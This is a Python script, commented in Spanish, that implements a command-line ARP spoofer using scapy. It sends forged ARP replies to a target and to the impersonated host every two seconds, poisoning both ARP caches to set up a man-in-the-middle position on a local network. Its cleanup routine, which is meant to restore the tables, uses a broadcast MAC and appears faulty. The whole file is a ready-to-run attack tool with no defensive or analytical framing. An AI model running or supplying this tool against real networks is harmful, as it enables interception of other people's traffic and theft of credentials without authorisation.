#!/usr/bin/env python3
import argparse
from scapy.all import ARP, send
import time
import sys
import signal

# Función para obtener los argumentos de la línea de comandos
def get_args():
    parser = argparse.ArgumentParser(description="ARP Spoofer")
    parser.add_argument("-t", "--target", required=True, dest="target_ip", help="Target IP address to spoof")
    parser.add_argument("-s", "--spoof", required=True, dest="spoof_ip", help="IP address to spoof as")
    return parser.parse_args()

# Función para enviar un paquete ARP de spoofing
def spoof(target_ip, spoof_ip):
    # Crear un paquete ARP con la IP de origen falsificada
    arp_packet = ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff")
    # Enviar el paquete ARP
    send(arp_packet, verbose=False)

# Función para restaurar la tabla ARP a su estado original
def restore(target_ip, spoof_ip):
    # Crear un paquete ARP para restaurar la tabla ARP
    arp_packet = ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwsrc="ff:ff:ff:ff:ff:ff", hwdst="ff:ff:ff:ff:ff:ff")
    # Enviar el paquete ARP varias veces para asegurar la restauración
    send(arp_packet, count=4, verbose=False)

# Manejador de señales para restaurar la tabla ARP cuando se detecta una interrupción (Ctrl+C)
def def_handler(sig, frame):
    print("\n[!] Restoring ARP tables...")
    restore(args.target_ip, args.spoof_ip)
    restore(args.spoof_ip, args.target_ip)
    sys.exit(0)
# Asignar el manejador de señales a la señal SIGINT (Ctrl+C)
signal.signal(signal.SIGINT, def_handler)

# Función principal
def main():
    global args
    args = get_args()  # Obtener los argumentos de la línea de comandos
    try:
        while True:
            # Enviar paquetes ARP de spoofing continuamente
            spoof(args.target_ip, args.spoof_ip)
            spoof(args.spoof_ip, args.target_ip)
            time.sleep(2)  # Esperar 2 segundos antes de enviar el siguiente paquete
    except KeyboardInterrupt:
        # Restaurar la tabla ARP cuando se detecta una interrupción (Ctrl+C)
        def_handler(None, None)

# Llamar a la función principal si el script se ejecuta directamente
if __name__ == "__main__":
    main()